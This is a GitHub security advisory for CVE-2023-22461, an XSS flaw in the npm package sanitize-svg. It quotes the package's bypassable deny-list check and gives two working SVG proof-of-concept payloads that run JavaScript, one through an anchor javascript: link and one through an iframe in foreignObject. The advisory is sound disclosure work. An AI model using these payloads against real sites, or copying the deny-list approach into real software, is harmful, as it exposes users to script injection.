# [H] @mattkrick/sanitize-svg vulnerable to Cross-Site Scripting (XSS)

## Summary
Severity: High
Advisory: GHSA-h857-2g56-468g
CVE: CVE-2023-22461
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2023-01-05
Source: https://github.com/advisories/GHSA-h857-2g56-468g
Type: github-advisory

## Affected
- npm: `@mattkrick/sanitize-svg` — affected >=0 <0.4.0

## Details
### Impact
The *sanitize-svg* package uses a deny-list-pattern to sanitize SVGs to prevent cross-site scripting (XSS). In doing so, literal `<script>`-tags and on-event handlers were detected:
```typescript
[...]
  const svgEl = div.firstElementChild!
  const attributes = Array.from(svgEl.attributes).map(({ name }) => name)
  const hasScriptAttr = !!attributes.find((attr) => attr.startsWith('on'))
  const scripts = svgEl.getElementsByTagName('script')
  return scripts.length === 0 && !hasScriptAttr ? svg : null
[...]
```

There are more ways to embed JavaScript in XML files.

**Anchor Tag** (requires user to click link):
```xml
<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
  <a href="javascript:alert(document.domain)">
    <text x="50" y="50" text-anchor="middle">Lauritz</text>
  </a>
</svg>
```

**Foreign Object Tag** (no user interaction required):
```xml
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        <text x="20" y="35">Lauritz</text>
        <foreignObject width="500" height="500">
                <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:confirm(document.domain);" width="400" height="250"/>
        </foreignObject>
</svg>
```

As a result, downstream software that relies on `sanitize-svg` and expects resulting SVGs to be safe, may be vulnerable to XSS. We are aware of at least one downstream project for which this vulnerability had security implications. 

### Patches
This vulnerability was addressed in v0.4.0.

### Workarounds
N/A

## References
- https://github.com/mattkrick/sanitize-svg/security/advisories/GHSA-h857-2g56-468g
- https://nvd.nist.gov/vuln/detail/CVE-2023-22461
- https://github.com/mattkrick/sanitize-svg/commit/b107e453ede7b58adcccae74a3e474c012eec85d
- https://github.com/mattkrick/sanitize-svg
